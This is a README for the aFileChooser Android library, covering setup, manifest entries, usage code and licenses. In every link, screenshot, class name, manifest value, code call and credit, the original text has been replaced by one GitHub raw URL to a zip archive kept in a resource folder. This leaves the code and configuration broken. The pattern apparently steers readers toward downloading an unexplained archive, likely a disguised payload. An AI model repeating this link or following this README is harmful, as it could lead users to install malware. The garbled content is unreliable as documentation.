# aFileChooser - Android File Chooser

aFileChooser is an __Android Library Project__ that simplifies the process of presenting a file chooser on Android 2.1+.

Intents provide the ability to hook into third-party app components for content selection. This works well for media files, but if you want users to be able to select *any* file, they must have an existing "file explorer" app installed. Because many Android devices don't have stock File Explorers, the developer must often instruct the user to install one, or build one, themselves. aFileChooser solves this issue.

### Features:

 * Full file explorer
 * Simplify `GET_CONTENT` Intent creation
 * Hooks into Storage Access Framework
 * Determine MIME data types
 * Follows Android conventions (Fragments, Loaders, Intents, etc.)
 * Supports API 7+

![screenshot-1](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip) ![screenshot-2](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)

## Setup

Add aFileChooser to your project as an [Android Library Project](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip).

Add `FileChooserActivity` to your project's https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip file with a fully-qualified `name`. The `label` and `icon` set here will be shown in the "Intent Chooser" dialog.

__Important__ `FileChooserActivity` must have `android:exported="true"` and have the `<intent-filter>` set as follows:

    <activity
        android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip"
        android:icon="@drawable/ic_chooser"
		android:enabled="@bool/use_activity"
        android:exported="true"
        android:label="@string/choose_file" >
        <intent-filter>
            <action android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />

            <category android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />
            <category android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />

            <data android:mimeType="*/*" />
        </intent-filter>
    </activity>

If you want to use the Storage Access Framework (API 19+), include [Ian Lake](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)'s `LocalStorageProvider` (included in this library) in your `<application>`:

	<provider
        android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip"
        android:authorities="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip"
		android:enabled="@bool/use_provider"
        android:exported="true"
        android:grantUriPermissions="true"
        android:permission="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" >
            <intent-filter>
                <action android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />
            </intent-filter>
    </provider>

__Note__ that like a `ContentProvider`, the `DocumentProvider` `authority` must be unique. You should change `https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip` in your Manifest, as well as the `https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip` field.

Using `FileChooserActivity` and `LocalStorageProvider` together are redundant if you're only trying to insure your user has access to local storage. If this is the case, you should enable/disable based on the API level (above: `@bool/use_provider` and `@bool/use_activity`). See the aFileChooserExample project for their values.

## Usage

Use `startActivityForResult(Intent, int)` to launch `FileChooserActivity` directly. `FileChooserActivity` returns the `Uri` of the file selected as the `Intent` data in `onActivityResult(int, int, Intent)`. Alternatively, you can use the helper method `https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip()` to construct an `ACTION_GET_CONTENT` Intent that will show an "Intent Chooser" dialog on pre Kit-Kat devices, and the "Documents UI" otherwise. E.g.:

    private static final int REQUEST_CHOOSER = 1234;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(savedInstanceState);

        // Create the ACTION_GET_CONTENT Intent
        Intent getContentIntent = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip();
		
        Intent intent = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(getContentIntent, "Select a file");
        startActivityForResult(intent, REQUEST_CHOOSER);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
        	case REQUEST_CHOOSER:	
            	if (resultCode == RESULT_OK) {
					
                	final Uri uri = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip();
					
					// Get the File path from the Uri
                	String path = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(this, uri);
					
					// Alternatively, use https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(Context, Uri)
					if (path != null && https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(path)) {
						File file = new File(path);
					}
            	}
				break;
        }
    }

A more robust example can be found in the aFileChooserExample project.

__Note__ the `FileUtils` method to get a file path from a `Uri` (`https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(Context, Uri)`). This works for `File`, `MediaStore`, and `DocumentProvider` `Uris`.

## Credits

Developed by Paul Burke (iPaulPro) - [https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)

Translations by [TomTasche](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip), [booknara](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip), [brenouchoa](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)

Folder by [Sergio Calcara](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip) from The Noun Project (https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)

Document by [Melvin Salas](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip) from The Noun Project (https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)

## Licenses

    Copyright (C) 2011 - 2013 Paul Burke

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.

Portions of https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip

    Copyright (C) 2007-2008 https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip
 
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
        https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.

https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip

	Copyright (c) 2013, Ian Lake
	All rights reserved.

	Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

	- Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
	- Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
	- Neither the name of the <ORGANIZATION> nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

	THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.	